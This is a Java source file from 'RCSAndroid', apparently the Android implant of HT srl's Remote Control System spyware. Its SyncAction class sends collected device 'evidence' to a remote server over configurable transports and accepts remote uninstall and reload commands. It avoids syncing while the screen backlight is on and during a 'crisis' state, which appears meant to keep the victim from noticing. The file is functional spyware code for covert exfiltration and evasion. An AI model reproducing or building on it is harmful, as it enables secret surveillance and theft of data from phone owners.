/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : SyncAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.action;

import java.util.Vector;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.Evidence;
import com.ht.RCSAndroidGUI.EvidenceCollector;
import com.ht.RCSAndroidGUI.action.sync.Protocol;
import com.ht.RCSAndroidGUI.action.sync.ProtocolException;
import com.ht.RCSAndroidGUI.action.sync.Transport;
import com.ht.RCSAndroidGUI.action.sync.ZProtocol;
import com.ht.RCSAndroidGUI.agent.Agent;
import com.ht.RCSAndroidGUI.agent.AgentManager;
import com.ht.RCSAndroidGUI.utils.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class SyncAction.
 */
public abstract class SyncAction extends SubAction {
	
	/** The log collector. */
	protected EvidenceCollector logCollector;
	
	/** The agent manager. */
	protected AgentManager agentManager;
	// protected Transport[] transports = new Transport[Transport.NUM];
	/** The transports. */
	protected Vector transports;
	
	/** The protocol. */
	protected Protocol protocol;

	/** The initialized. */
	protected boolean initialized;

	// #ifdef DEBUG
	/** The debug. */
	protected static Debug debug = new Debug("SyncAction");

	// #endif

	/**
	 * Instantiates a new sync action.
	 *
	 * @param actionId the action id
	 * @param confParams the conf params
	 */
	public SyncAction(final int actionId, final byte[] confParams) {
		super(actionId, confParams);

		logCollector = EvidenceCollector.self();
		agentManager = AgentManager.self();
		transports = new Vector();

		protocol = new ZProtocol();
		initialized = parse(confParams);
		initialized &= initTransport();
	}

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.action.SubAction#execute()
	 */
	public boolean execute() {
		// #ifdef DBC
		Check.requires(protocol != null, "execute: null protocol");
		Check.requires(transports != null, "execute: null transports");
		// #endif

		if (status.synced == true) {
			// #ifdef DEBUG
			debug.warn("Already synced in this action: skipping");
			// #endif
			return false;
		}

		if (status.crisisSync()) {
			// #ifdef DEBUG
			debug.warn("SyncAction - no sync, we are in crisis");
			// #endif
			return false;
		}

		// #ifndef DEBUG
		if (status.backlight()) {
			return false;
		}
		// #endif

		wantReload = false;
		wantUninstall = false;

		agentManager.reloadAgent(Agent.AGENT_DEVICE);

		boolean ret = false;

		for (int i = 0; i < transports.size(); i++) {
			final Transport transport = (Transport) transports.elementAt(i);

			// #ifdef DEBUG
			debug.trace("execute transport: " + transport);
			debug.trace("transport Sync url: " + transport.getUrl());
			// #endif

			if (transport.isAvailable()) {
				// #ifdef DEBUG
				debug.trace("execute: transport available");
				// #endif
				protocol.init(transport);

				try {
					ret = protocol.perform();
					wantUninstall = protocol.uninstall;
					wantReload = protocol.reload;
				} catch (final ProtocolException e) {
					// #ifdef DEBUG
					debug.error(e);
					// #endif
					ret = false;
				}
				// #ifdef DEBUG
				debug.trace("execute protocol: " + ret);
				// #endif

			} else {
				// #ifdef DEBUG
				debug.trace("execute: transport not available");
				// #endif
			}

			if (ret) {
				// #ifdef DEBUG
				debug.info("SyncAction OK");
				Evidence.info("Synced with url:" + transport.getUrl());
				// #endif

				status.synced = true;
				return true;
			}

			// #ifdef DEBUG
			debug.error("SyncAction Unable to perform");
			// #endif

		}

		return false;
	}

	/**
	 * Parses the.
	 *
	 * @param confParams the conf params
	 * @return true, if successful
	 */
	protected abstract boolean parse(final byte[] confParams);

	/**
	 * Inits the transport.
	 *
	 * @return true, if successful
	 */
	protected abstract boolean initTransport();
}